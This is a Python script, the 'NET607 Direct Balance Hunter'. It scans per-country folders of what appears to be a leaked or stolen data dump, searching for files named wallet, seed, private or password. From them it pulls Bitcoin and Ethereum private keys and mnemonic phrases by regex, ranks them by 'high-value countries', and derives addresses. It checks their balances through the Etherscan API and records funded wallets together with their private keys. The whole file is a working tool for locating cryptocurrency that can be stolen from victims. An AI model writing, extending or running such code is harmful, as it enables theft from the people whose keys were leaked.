#!/usr/bin/env python3
"""
NET607 Direct Balance Hunter
Direct key processing from NET607 without loading huge JSON
"""

import os
import re
import time
import asyncio
import aiohttp
from datetime import datetime
from pathlib import Path
import json
import hashlib
import random
from web3 import Web3
from eth_keys import keys as eth_keys
from eth_utils import to_checksum_address

class NET607DirectHunter:
    def __init__(self):
        self.session = None
        self.api_keys = []
        self.results_file = f"NET607_DIRECT_RESULTS_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        self.funded_wallets = []
        self.checked_count = 0
        self.start_time = time.time()
        
        # Load API configuration
        self.load_api_config()
        
    def load_api_config(self):
        """Load API keys from configuration"""
        try:
            with open('api_config.json', 'r') as f:
                config = json.load(f)
                self.api_keys = [
                    key for provider in config.values() 
                    for key in (provider.get('keys', []) if isinstance(provider.get('keys'), list) else [])
                    if key and key.strip()
                ]
            print(f"✅ Loaded {len(self.api_keys)} API keys")
        except Exception as e:
            print(f"⚠️  API config error: {e}")
            # Add some default API keys for testing
            self.api_keys = ['REPLACE_WITH_YOUR_KEY']  # User should replace this
    
    def extract_keys_from_net607(self, limit: int = 10000):
        """Extract keys directly from NET607 directories"""
        net607_path = Path('net607')
        if not net607_path.exists():
            print("❌ NET607 directory not found")
            return []
        
        print(f"🔍 Extracting keys directly from NET607...")
        
        # Regex patterns for different key formats
        patterns = [
            # Bitcoin private keys (WIF format)
            re.compile(r'\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b'),
            # Ethereum private keys (64 hex chars)
            re.compile(r'\b[a-fA-F0-9]{64}\b'),
            # Private keys with 0x prefix
            re.compile(r'\b0x[a-fA-F0-9]{64}\b'),
            # Wallet.dat style keys
            re.compile(r'[a-fA-F0-9]{64}'),
            # Mnemonic phrases (12-24 words)
            re.compile(r'\b(?:[a-z]+ ){11,23}[a-z]+\b'),
        ]
        
        extracted_keys = []
        processed_dirs = 0
        
        # Get all country directories
        country_dirs = [d for d in net607_path.iterdir() if d.is_dir()]
        
        # Prioritize high-value countries
        priority_countries = ['US', 'CN', 'GB', 'DE', 'JP', 'KR', 'SG', 'CH', 'NL', 'CA']
        
        # Sort directories by priority
        def sort_key(directory):
            country_code = directory.name.split(']')[0].strip('[')
            if country_code in priority_countries:
                return (0, priority_countries.index(country_code))
            else:
                return (1, country_code)
        
        sorted_dirs = sorted(country_dirs, key=sort_key)
        
        for country_dir in sorted_dirs[:50]:  # Process top 50 directories
            if len(extracted_keys) >= limit:
                break
                
            processed_dirs += 1
            print(f"🔍 [{processed_dirs}/50] Processing {country_dir.name}...")
            
            # Look for high-value files
            wallet_files = []
            
            for file_path in country_dir.rglob('*'):
                if not file_path.is_file():
                    continue
                
                # Skip large files (>10MB)
                try:
                    if file_path.stat().st_size > 10 * 1024 * 1024:
                        continue
                except:
                    continue
                
                filename_lower = file_path.name.lower()
                
                # High-value file types
                if any(keyword in filename_lower for keyword in [
                    'wallet', 'private', 'key', 'seed', 'mnemonic', 'backup',
                    'btc', 'eth', 'crypto', 'bitcoin', 'ethereum', 'recovery',
                    'password', 'secret', 'coin'
                ]):
                    wallet_files.append(file_path)
            
            # Process wallet files
            for file_path in wallet_files[:20]:  # Limit per directory
                if len(extracted_keys) >= limit:
                    break
                    
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read(100000)  # Read first 100KB
                    
                    # Extract keys using patterns
                    for pattern in patterns:
                        matches = pattern.findall(content)
                        for match in matches:
                            if len(extracted_keys) >= limit:
                                break
                            
                            key_data = {
                                'key': match.strip(),
                                'source': str(file_path.relative_to(net607_path)),
                                'country': country_dir.name.split(']')[0].strip('['),
                                'file_type': file_path.suffix.lower(),
                                'priority_score': self.calculate_priority_score(match, str(file_path))
                            }
                            
                            extracted_keys.append(key_data)
                
                except Exception as e:
                    continue
        
        # Sort by priority score
        extracted_keys.sort(key=lambda x: x['priority_score'], reverse=True)
        
        print(f"✅ Extracted {len(extracted_keys)} keys from {processed_dirs} directories")
        return extracted_keys
    
    def calculate_priority_score(self, key: str, file_path: str) -> float:
        """Calculate priority score for a key"""
        score = 0.5  # Base score
        
        file_path_lower = file_path.lower()
        
        # File type bonuses
        if 'wallet' in file_path_lower:
            score += 0.3
        if 'private' in file_path_lower or 'key' in file_path_lower:
            score += 0.2
        if 'backup' in file_path_lower or 'recovery' in file_path_lower:
            score += 0.2
        if any(crypto in file_path_lower for crypto in ['btc', 'eth', 'bitcoin', 'ethereum']):
            score += 0.2
        
        # Key format bonuses
        if len(key) == 64 and all(c in '0123456789abcdefABCDEF' for c in key):
            score += 0.3  # Likely Ethereum private key
        elif key.startswith('0x') and len(key) == 66:
            score += 0.4  # Ethereum private key with 0x prefix
        elif key[0] in '5KL' and len(key) in [51, 52]:
            score += 0.2  # Bitcoin WIF format
        
        # Entropy check
        if self.has_good_entropy(key):
            score += 0.1
        
        return min(score, 1.0)  # Cap at 1.0
    
    def has_good_entropy(self, key: str) -> bool:
        """Check if key has good entropy"""
        if len(key) < 20:
            return False
        
        # Count unique characters
        unique_chars = len(set(key.lower()))
        return unique_chars > len(key) * 0.3
    
    def get_api_key(self) -> str:
        """Get a random API key"""
        if not self.api_keys or self.api_keys == ['REPLACE_WITH_YOUR_KEY']:
            return ""
        return random.choice(self.api_keys)
    
    async def check_single_balance(self, session: aiohttp.ClientSession, key_data: dict) -> dict:
        """Check balance for a single key"""
        try:
            key = key_data['key']
            
            # Try to convert to Ethereum private key
            try:
                # Handle different formats
                if key.startswith('0x'):
                    pk_bytes = bytes.fromhex(key[2:])
                elif len(key) == 64 and all(c in '0123456789abcdefABCDEF' for c in key):
                    pk_bytes = bytes.fromhex(key)
                else:
                    return None  # Skip non-Ethereum keys for now
                
                if len(pk_bytes) != 32:
                    return None
                
                private_key_obj = eth_keys.PrivateKey(pk_bytes)
                address = to_checksum_address(private_key_obj.public_key.to_address())
                
            except Exception:
                return None
            
            # Check balance using Etherscan API
            api_key = self.get_api_key()
            url = "https://api.etherscan.io/api"
            params = {
                'module': 'account',
                'action': 'balance',
                'address': address,
                'tag': 'latest'
            }
            
            if api_key:
                params['apikey'] = api_key
            
            async with session.get(url, params=params) as response:
                if response.status == 200:
                    data = await response.json()
                    if data.get('status') == '1' and 'result' in data:
                        balance_wei = int(data['result'])
                        if balance_wei > 0:
                            balance_eth = balance_wei / 10**18
                            
                            result = {
                                'private_key': key,
                                'address': address,
                                'balance_wei': balance_wei,
                                'balance_eth': balance_eth,
                                'source': key_data['source'],
                                'country': key_data['country'],
                                'priority_score': key_data['priority_score'],
                                'checked_at': datetime.now().isoformat()
                            }
                            
                            print(f"💰 FUNDED WALLET FOUND!")
                            print(f"    Address: {address}")
                            print(f"    Balance: {balance_eth:.6f} ETH ({balance_wei} wei)")
                            print(f"    Source: {key_data['source']}")
                            print(f"    Country: {key_data['country']}")
                            
                            return result
            
            # Rate limiting
            await asyncio.sleep(0.2)
            return None
            
        except Exception as e:
            return None
    
    async def hunt_balances(self, max_keys: int = 5000):
        """Hunt for funded wallets"""
        print(f"🚀 Starting NET607 direct hunting...")
        
        # Extract keys
        keys = self.extract_keys_from_net607(limit=max_keys)
        
        if not keys:
            print("❌ No keys extracted")
            return
        
        print(f"🎯 Checking balances for {len(keys)} keys...")
        
        connector = aiohttp.TCPConnector(limit=50, limit_per_host=25)
        timeout = aiohttp.ClientTimeout(total=30)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            batch_size = 25
            
            for i in range(0, len(keys), batch_size):
                batch = keys[i:i + batch_size]
                batch_num = i // batch_size + 1
                total_batches = (len(keys) + batch_size - 1) // batch_size
                
                print(f"\n🔍 Checking batch {batch_num}/{total_batches} ({len(batch)} keys)...")
                
                # Create tasks for this batch
                tasks = []
                for key_data in batch:
                    task = self.check_single_balance(session, key_data)
                    tasks.append(task)
                
                # Execute batch
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Process results
                for result in results:
                    if isinstance(result, dict) and result:
                        self.funded_wallets.append(result)
                        self.save_results()
                
                self.checked_count += len(batch)
                
                # Progress update
                elapsed = time.time() - self.start_time
                rate = self.checked_count / elapsed if elapsed > 0 else 0
                
                print(f"📊 Progress: {self.checked_count}/{len(keys)} keys checked")
                print(f"⚡ Rate: {rate:.1f} keys/sec")
                print(f"💰 Funded wallets found: {len(self.funded_wallets)}")
                
                # Brief pause between batches
                await asyncio.sleep(2)
    
    def save_results(self):
        """Save current results to file"""
        results = {
            'scan_info': {
                'scan_type': 'NET607_direct_hunt',
                'started_at': datetime.fromtimestamp(self.start_time).isoformat(),
                'completed_at': datetime.now().isoformat(),
                'keys_checked': self.checked_count,
                'funded_wallets_found': len(self.funded_wallets),
                'total_balance_wei': sum(w.get('balance_wei', 0) for w in self.funded_wallets),
                'total_balance_eth': sum(w.get('balance_eth', 0) for w in self.funded_wallets)
            },
            'funded_wallets': self.funded_wallets
        }
        
        with open(self.results_file, 'w') as f:
            json.dump(results, f, indent=2)
    
    def print_summary(self):
        """Print final summary"""
        elapsed = time.time() - self.start_time
        
        print(f"\n🎉 NET607 DIRECT HUNT COMPLETE!")
        print(f"==================================================")
        print(f"⏱️  Total Time: {elapsed:.1f} seconds")
        print(f"🔍 Keys Checked: {self.checked_count:,}")
        print(f"⚡ Average Rate: {self.checked_count/elapsed:.1f} keys/sec")
        print(f"💰 Funded Wallets Found: {len(self.funded_wallets)}")
        
        if self.funded_wallets:
            total_eth = sum(w.get('balance_eth', 0) for w in self.funded_wallets)
            print(f"💎 Total Balance Found: {total_eth:.6f} ETH")
            print(f"\n🏆 FUNDED WALLETS:")
            for i, wallet in enumerate(self.funded_wallets, 1):
                print(f"  [{i}] {wallet['address']}")
                print(f"      Balance: {wallet['balance_eth']:.6f} ETH")
                print(f"      Source: {wallet['source']}")
                print(f"      Country: {wallet['country']}")
        
        print(f"\n💾 Results saved to: {self.results_file}")

async def main():
    """Main execution function"""
    hunter = NET607DirectHunter()
    
    try:
        # Hunt for up to 5000 high-priority keys
        await hunter.hunt_balances(max_keys=5000)
        
    except KeyboardInterrupt:
        print("\n⚠️  Interrupted by user")
    except Exception as e:
        print(f"❌ Error during hunting: {e}")
    finally:
        hunter.save_results()
        hunter.print_summary()

if __name__ == "__main__":
    print("🎯 NET607 DIRECT BALANCE HUNTER")
    print("=" * 50)
    asyncio.run(main())
